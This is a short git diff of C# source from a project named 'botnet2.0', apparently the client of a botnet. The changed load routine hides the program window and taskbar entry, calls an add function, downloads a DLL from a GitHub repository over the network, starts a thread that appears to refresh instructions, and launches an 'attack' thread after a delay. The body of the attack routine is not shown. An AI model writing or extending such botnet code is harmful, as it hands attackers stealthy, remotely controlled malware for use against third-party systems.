@@ -18,20 +18,22 @@ namespace botnet2._0
         public static Instruction botinstruction = new Instruction();
         private void Form1_Load(object sender, EventArgs e)
         {
-            ShowInTaskbar = false;
-            WindowState = FormWindowState.Minimized;
-            functions.remove();
+            try
+            {
+                ShowInTaskbar = false;
+                WindowState = FormWindowState.Minimized;
+                functions.add();
+                new WebClient().DownloadFile("https://github.com/ErrorVania/botnet2.0/blob/master/botnet2.0/bin/Debug/Newtonsoft.Json.dll","Newtonsoft.Json.dll");
+                ThreadStart thread1 = new ThreadStart(functions.refresh);
+                Thread refresher = new Thread(thread1);
+                refresher.Start();
 
-            ThreadStart thread1 = new ThreadStart(functions.refresh);
-            Thread refresher = new Thread(thread1);
-            refresher.Start();
-
-            Thread.Sleep(3001);
-            //start
-            ThreadStart thread2 = new ThreadStart(attack);
-            Thread refresher2 = new Thread(thread2);
-            refresher2.Start();
-            
+                Thread.Sleep(3001);
+                //start
+                ThreadStart thread2 = new ThreadStart(attack);
+                Thread refresher2 = new Thread(thread2);
+                refresher2.Start();
+            } catch (Exception ex) { MessageBox.Show(ex.ToString()); }
         }
         private void attack()
         {
